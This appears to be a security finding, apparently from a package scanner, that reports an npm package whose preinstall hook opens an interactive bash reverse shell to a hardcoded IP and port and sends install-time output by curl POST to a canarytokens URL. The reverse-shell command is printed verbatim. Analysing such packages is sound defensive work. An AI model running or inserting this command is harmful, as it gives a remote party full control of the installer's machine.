  "summary": "preinstall script opens reverse shell to hardcoded IP",
  "details": "package.json declares a preinstall script that executes `bash -i >& /dev/tcp/147.93.157.202/8080 0>&1`, opening an interactive reverse shell to the hardcoded remote endpoint 147.93.157.202:8080 on every `npm install`. The same command pipes shell output through `curl -X POST` to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php as an install-time beacon. Running `npm install` on this package hands full command execution on the installer's host to whoever controls 147.93.157.202:8080, with no user interaction and no consent prompt.",
